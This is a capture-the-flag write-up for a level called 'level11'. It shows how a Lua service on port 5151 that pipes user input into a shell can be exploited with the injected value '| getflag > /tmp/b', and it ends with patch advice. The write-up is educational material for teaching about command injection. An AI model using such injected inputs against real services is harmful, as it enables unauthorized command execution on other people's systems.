## level11

- **How we found it**
	
	Noticed `level11.lua` listening on localhost port 5151
	Examined the script and saw it builds a shell command with our input:

	```bash
	prog = io.popen("echo "..pass.." | sha1sum", "r")
	```

- **How we exploited it**

	**1.** Connect to the service:

	```bash
	nc 127.0.0.1 5151
	# Password:
	```

	**2.** Inject a pipeline to run `getflag` instead of just echoing:

	```bash
	| getflag > /tmp/b
	```

	The server runs:

	```bash
	echo | getflag > /tmp/b | sha1sum
	```

	which executes getflag as the level11 user and writes the flag token to /tmp/b.

	**3.** Read out the flag:

	```bash
	cat /tmp/b
	# Check flag. Here is your token : fa6v5ateaw21peobuub8ipe6s
	```

- **Utility of this exercise**

	Demonstrates how unsanitized user input in shell‑based hashing routines can lead to command injection.

- **How to patch**

	- **Avoid shelling out**: compute SHA‑1 in‑process (e.g., via a Lua crypto library) instead of `io.popen("echo … | sha1sum")`.

	- **Sanitize or escape input**: reject or properly escape metacharacters (`|`, `;`, `>`, etc.) before passing to a shell.

	- **Drop elevated privileges**: do not run this script set‑uid, or explicitly clear dangerous environment variables and run under a restricted account.

	- **Use safe exec variants**: if a subprocess is needed, invoke it with an argument array rather than a shell command string.